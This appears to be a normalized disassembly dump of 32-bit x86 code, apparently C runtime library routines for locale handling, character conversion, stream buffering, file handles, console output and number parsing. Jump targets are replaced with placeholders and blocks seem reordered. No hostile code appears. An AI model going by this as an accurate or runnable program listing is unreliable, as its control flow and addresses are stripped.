mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub esi eax
mov eax esi
jmp r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi eax
je r-xdata
sub_1001a384
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001a292
add esp 0x10
cmp [ ebp + 0x8 ] esi
jne r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
call sub_1000e8db
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1000e873
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
ja r-xdata
pop esi
pop ebp
retn
pop esi
pop ebp
jmp sub_1001ba10
sub_1001a3e2
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp esi ebx
jne r-xdata
push edi
cmp [ ebp + 0x8 ] ebx
ja r-xdata
call sub_1000e8db
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_1000e873
add esp 0x14
mov eax esi
jmp r-xdata
xor ecx ecx
cmp [ ebp + 0x10 ] ebx
mov [ esi ] bl
setne cl
inc ecx
cmp [ ebp + 0x8 ] ecx
ja r-xdata
call sub_1000e8db
push 0x16
pop esi
pop ebx
leave
retn 0xc
mov ecx [ ebp + 0xc ]
add ecx 0xfffffffe
cmp ecx 0x22
ja r-xdata
call sub_1000e8db
push 0x22
jmp r-xdata
pop edi
mov [ ebp - 0x4 ] ebx
mov ecx esi
cmp [ ebp + 0x10 ] ebx
je r-xdata
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_1000e873
add esp 0x14
mov eax esi
jmp r-xdata
mov edi ecx
mov [ esi ] 0x2d
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] 0x1
neg eax
add dl 0x30
add dl 0x57
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x8 ]
jb r-xdata
mov edx [ ebp + 0x8 ]
cmp [ ebp - 0x4 ] edx
jb r-xdata
mov [ ecx ] dl
inc ecx
inc [ ebp - 0x4 ]
xor ebx ebx
cmp eax ebx
jbe r-xdata
mov [ ecx ] bl
dec ecx
mov [ esi ] bl
jmp r-xdata
xor edx edx
div [ ebp + 0xc ]
cmp edx 0x9
jbe r-xdata
mov dl [ edi ]
mov al [ ecx ]
mov [ ecx ] dl
dec ecx
mov [ edi ] al
inc edi
cmp edi ecx
jb r-xdata
xor eax eax
sub_1001a4bf
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0xa
mov eax [ ebp + 0x8 ]
jne r-xdata
push 0x0
push [ ebp + 0x14 ]
test eax eax
jge r-xdata
push 0x1
push 0xa
jmp r-xdata
push [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
call sub_1001a3e2
pop ebp
retn
sub_1001a4e9
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
push 0x1004
push [ ebp + 0x8 ]
mov [ ebp - 0x6 ] 0x0
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_1001a27c
pop ecx
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1000ac69
leave
retn
sub_1001a532
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov [ ebp - 0x30 ] eax
mov eax [ eax ]
push esi
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x2c ] edi
cmp eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp - 0x20 ]
mov esi [ GetCPInfo@IAT ]
lea ecx [ ebp - 0x18 ]
push ecx
push eax
call esi
mov ebx [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
mov esi eax
cmp esi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
mov [ ebp - 0x1c ] edi
cmp esi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x40 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1000ac69
leave
retn
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
lea eax [ esi + esi ]
push eax
push edi
push [ ebp - 0x1c ]
call sub_1000b660
add esp 0xc
push esi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
test eax eax
je r-xdata
lea eax [ esi + esi + 0x8 ]
cmp eax 0x400
ja r-xdata
mov esi [ ebp - 0x24 ]
mov [ ebp - 0x2c ] 0x1
cmp esi 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
call sub_1001460a
pop ecx
mov ebx [ ebp - 0x34 ]
cmp ebx edi
je r-xdata
push eax
call sub_1000c036
pop ecx
cmp eax edi
je r-xdata
call sub_1001a250
mov eax esp
cmp eax edi
je r-xdata
cmp esi edi
push [ ebp - 0x28 ]
call sub_1000b9b0
mov esi eax
pop ecx
inc esi
mov ebx [ WideCharToMultiByte@IAT ]
cmp [ ebp - 0x2c ] edi
jne r-xdata
push edi
push edi
push [ ebp + 0x1c ]
push ebx
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push esi
push 0x1
call sub_10011a2a
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push edi
push edi
push edi
push edi
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
mov esi eax
cmp esi edi
je r-xdata
mov [ ebp - 0x20 ] ebx
jmp r-xdata
cmp [ ebp - 0x1c ] edi
je r-xdata
add eax 0x8
push edi
push edi
push esi
push eax
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
cmp eax edi
jne r-xdata
cmp [ ebp - 0x24 ] 0xffffffff
je r-xdata
push [ ebp - 0x20 ]
call sub_1000bf59
pop ecx
mov [ ebp - 0x20 ] edi
jmp r-xdata
mov ecx [ ebp - 0x30 ]
mov [ ecx ] eax
sub_1001a6e6
push 0x10
push r--data
call sub_10011ecc
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_100129fe
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001a77c
mov eax [ ebp - 0x1c ]
call sub_10011f11
retn
mov esi edi
shl esi 0x2
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_1001bae8
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ esi + eax ]
call sub_1000bf59
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
inc [ ebp - 0x1c ]
sub_1001a785
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_1001831a
pop ecx
push eax
call sub_10018191
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_1001a7ed
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_1001a785
pop ecx
test eax eax
je r-xdata
push esi
call sub_1001a835
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_1001831a
push eax
call sub_1001bb64
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_1001a835
push 0x14
push r--data
call sub_10011ecc
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_100129fe
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001a906
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_10011f11
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_10016aec
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_1001a8d7
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_1001a7ed
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_1001a7ed
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_1001a918
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1000afe5
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_1001a983
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1000afe5
cmp [ ebp + 0x14 ] 0xffffffff
jge r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
xor eax eax
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_1001a9c1
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
cmp ecx ebx
push esi
push edi
jl r-xdata
call sub_1000e8db
mov [ eax ] 0x9
call sub_1000e8ee
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_1001aa47
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_1000e8ee
and [ eax ] 0x0
call sub_1000e8db
mov [ eax ] 0x9
or eax 0xffffffff
pop ebp
retn
call sub_1000e8ee
mov [ eax ] esi
call sub_1000e8db
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_1000e873
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax [ rw-data ]
jae r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
add eax ecx
test [ eax + 0x4 ] 0x1
jne r-xdata
mov eax [ eax ]
sub_1001aabe
push 0xc
push r--data
call sub_10011ecc
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_100129fe
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_10011f11
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001ab55
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_10019a15
pop ecx
pop ecx
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_1001ab5e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_1001ab85
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
xor esi esi
cmp [ rw-data ] esi
je r-xdata
push esi
push esi
push 0x5
lea eax [ ebp - 0xc ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push esi
call [ GetConsoleOutputCP@IAT ]
push eax
call [ WideCharToMultiByte@IAT ]
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax 0xffff
jmp r-xdata
push esi
lea edx [ ebp - 0x10 ]
push edx
push eax
lea eax [ ebp - 0xc ]
push eax
push ecx
call [ WriteConsoleA@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_1001bc45
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_1000ac69
leave
retn
mov ax [ ebp + 0x8 ]
push esi
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
sub_1001ac50
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_1001ac84
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x14 ]
call sub_1000afe5
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
xor edi edi
cmp eax edi
je r-xdata
cmp esi edi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] edi
je r-xdata
call sub_1000e8db
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_1000e873
add esp 0x14
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
push ebx
mov bl [ esi ]
mov [ ebp - 0x4 ] edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x14 ]
push eax
movzx eax bl
push 0x8
push eax
call sub_1001aede
mov ecx [ ebp - 0x14 ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop edi
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
jl r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
mov esi [ ecx + 0xc8 ]
mov eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
test ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
mov cl bl
sub cl 0x61
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
inc edi
mov bl [ edi ]
inc edi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_1000e8db
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov ebx [ ebp - 0x4 ]
imul ebx [ ebp + 0x14 ]
add ebx ecx
mov [ ebp - 0x4 ] ebx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
test cl 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx edx
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
sub_1001aeb3
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_1001ac84
add esp 0x14
pop ebp
retn
sub_1001aede
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_1000afe5
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_1001850c
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_100167e9
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_1001af96
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_1000e8db
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_1000e873
add esp 0x14
jmp r-xdata
mov eax 0xffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_1001826d
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
mov [ esi + 0x4 ] edi
cmp eax 0x1
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push esi
call sub_1001831a
pop ecx
push eax
call sub_1001c253
add esp 0xc
mov [ esi + 0x4 ] eax
cmp eax edi
je r-xdata
cmp eax 0xffffffff
je r-xdata
test [ esi + 0xc ] 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
push esi
call sub_1001831a
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi ]
add [ esi + 0x4 ] 0xfffffffe
movzx eax [ ecx ]
add ecx 0x2
mov [ esi ] ecx
jmp r-xdata
mov eax [ esi + 0xc ]
test al 0x8
je r-xdata
mov eax rw-data
push esi
call sub_1001831a
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop edi
pop esi
pop ebp
retn
test eax 0x400
jne r-xdata
or [ esi + 0xc ] 0x2000
push esi
call sub_1001831a
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_1001831a
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov [ esi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_1001b0cf
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x40
push edi
jne r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffff
je r-xdata
push esi
call sub_1001831a
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
mov eax [ esi + 0xc ]
test al 0x1
jne r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
xor edi edi
cmp [ esi + 0x8 ] edi
jne r-xdata
test al al
jns r-xdata
call sub_1000e8db
xor edi edi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_1000e873
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov edi eax
sar edi 0x5
shl ecx 0x6
add ecx [ edi * 4 + rw-data ]
jmp r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x8 ]
jne r-xdata
push esi
call sub_1001826d
pop ecx
test al 0x2
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
dec [ esi ]
test [ esi + 0xc ] 0x40
mov eax [ esi ]
je r-xdata
cmp [ esi + 0x4 ] edi
jne r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov [ eax ] bl
cmp [ eax ] bl
je r-xdata
inc eax
mov [ esi ] eax
test [ eax + 0x24 ] 0x80
je r-xdata
pop ebx
mov eax [ esi + 0xc ]
inc [ esi + 0x4 ]
and eax 0xffffffef
or eax 0x1
mov [ esi + 0xc ] eax
mov eax ebx
and eax 0xff
jmp r-xdata
inc eax
mov [ esi ] eax
sub_1001b1c0
push 0xc
push r--data
call sub_10011ecc
xor eax eax
xor esi esi
cmp [ ebp + 0xc ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0xc ]
call sub_10016aab
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001b0cf
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001b228
mov eax [ ebp - 0x1c ]
call sub_1000e8db
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_1000e873
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_10011f11
retn
sub_1001b232
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_1000e8db
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_1000e873
add esp 0x14
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_1001826d
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
mov [ esi + 0x4 ] edi
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push esi
call sub_1001831a
pop ecx
push eax
call sub_1001c253
add esp 0xc
mov [ esi + 0x4 ] eax
cmp eax edi
je r-xdata
test [ esi + 0xc ] 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
push esi
call sub_1001831a
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi ]
dec [ esi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
mov eax [ esi + 0xc ]
test al 0x8
je r-xdata
mov eax rw-data
push esi
call sub_1001831a
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop edi
pop esi
pop ebp
retn
test eax 0x400
